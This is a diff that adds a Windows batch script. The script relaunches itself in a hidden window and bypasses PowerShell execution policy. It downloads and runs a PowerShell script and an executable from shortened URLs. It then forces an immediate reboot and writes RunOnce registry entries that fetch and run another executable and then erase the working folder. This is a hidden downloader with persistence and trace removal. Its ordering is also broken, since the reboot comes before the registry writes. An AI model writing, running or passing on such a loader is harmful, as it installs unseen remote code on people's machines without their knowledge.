@@ -1,0 +1,48 @@
+@echo off
+setlocal
+
+:: Auto-run in hidden window
+if "%~1"=="hidden" goto :main
+
+:: Launch self with hidden window
+powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "& '%~dpnx0' hidden"
+
+:: Exit original window
+exit /b
+
+:main
+:: Create temp directory
+set "TARGET_DIR=C:\Windows\Temp\MyApp"
+if not exist "%TARGET_DIR%" (
+    set "TARGET_DIR=%USERPROFILE%\Desktop\MyApp"
+    if not exist "%TARGET_DIR%" (
+        echo Failed to create temp directory, using Desktop
+        mkdir "%TARGET_DIR%" || goto :desktop_error
+    )
+)
+
+:: Create directory if needed
+if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%" || goto :desktop_error
+
+:: Download and execute PowerShell script in hidden window
+powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://kntn.ly/d4af776d' -OutFile '%TARGET_DIR%\script.ps1'; . '%TARGET_DIR%\script.ps1'"
+
+:: Download and execute EXE
+powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://kntn.ly/fe5d9b04' -OutFile '%TARGET_DIR%\file.exe'; Start-Process '%TARGET_DIR%\file.exe'"
+
+:: Reboot system
+shutdown /r /t 0
+
+:: On next boot, download and run another executable
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "PostRebootTask" /t REG_SZ /d "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri 'https://kntn.ly/0ade1ece' -OutFile '%TARGET_DIR%\postreboot.exe'; Start-Process '%TARGET_DIR%\postreboot.exe'\"" /f
+
+:: Cleanup function (runs on next boot)
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" /v "CleanupTask" /t REG_SZ /d "cmd /c del /q \"%TARGET_DIR%\\*\" && rmdir /s /q \"%TARGET_DIR%\"" /f
+
+goto :end
+
+:desktop_error
+echo ERROR: Failed to create temp directory
+exit /b 1
+
+:end
